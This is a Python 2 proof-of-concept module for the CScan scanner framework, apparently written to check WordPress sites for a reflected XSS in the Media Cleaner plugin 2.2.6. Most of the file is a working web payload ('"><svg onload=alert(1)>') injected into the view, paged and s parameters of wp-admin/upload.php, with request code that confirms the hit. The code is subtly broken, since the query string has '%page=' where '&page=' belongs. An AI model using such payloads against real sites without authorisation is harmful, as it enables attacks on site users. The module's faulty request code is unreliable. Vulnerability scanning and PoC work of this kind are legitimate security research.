# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = '1c9d3c86-079f-4e31-9a9b-feee41cbdb29'
    name = 'WordPress Media Cleaner Plugin 2.2.6 XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-03-02'  # 漏洞公布时间
    desc = '''
        /wordpress/wp-admin/upload.php?s=test&page=wp-media-cleaner&view={XSS}&paged={XSS}&s={XSS}
        parameters: 'view' and 'paged' and 's' are not filtered.
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Media Cleaner Plugin 2.2.6 '  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1fe76b15-dd37-43a8-829c-6b1e9e28f790'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/wordpress/wp-admin/upload.php?s=test%page=wp-media-cleaner&view="><svg onload=alert(1)>'
            payload += '&paged="><svg onload=alert(1)>&s="><svg onload=alert(1)>'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)

            content = urllib2.urlopen(req).read()
            if '<svg onload=alert(1)>' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
